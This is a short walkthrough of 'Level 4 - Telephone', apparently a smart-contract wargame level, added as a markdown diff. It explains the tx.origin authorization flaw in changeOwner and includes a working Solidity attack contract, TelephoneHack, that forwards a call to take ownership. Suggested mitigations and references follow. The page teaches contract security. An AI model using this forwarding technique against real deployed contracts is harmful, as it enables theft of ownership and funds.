@@ -1,0 +1,58 @@
+---
+title: Level 4 - Telephone
+slug: level-4
+published: 05-16-2023
+lastEdited:
+---
+
+## Objectives
+
+1. Claim ownership of the contract.
+
+## Vulnerabilities
+
+### Bad access control
+
+The critical function `changeOwner` will change the ownership if `tx.origin != msg.sender` which
+can be easily recreated by anyone.
+
+### tx.origin used for authorization
+
+Using `tx.origin` for authorizing critical behavior can be exploited by malicious contract forwarding.
+
+## Exploit
+
+1. Create a malicious contract that will call `changeOwner` from the Telephone contract.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneHack {
+    ITelephone target;
+
+    constructor(address _targetAddress){
+        target = ITelephone(_targetAddress);
+    }
+
+    function attack() external {
+        target.changeOwner(msg.sender);
+    }
+}
+```
+
+2. Call the `attack` function transfer the ownership to yourself.
+
+## Suggested mitigation
+
+1. Remove all traces of `tx.origin` in the authorization logic since it's bad practice.
+2. Adding a `onlyOwner` function modifier to `changeOwner`.
+
+## Further reading
+
+- SWC-115 - SWC - Authorization through tx.origin <ExternalLink href={"https://swcregistry.io/docs/SWC-115"} />
+- Ownership library from OpenZeppelin <ExternalLink href={"https://docs.openzeppelin.com/contracts/2.x/api/ownership"} />
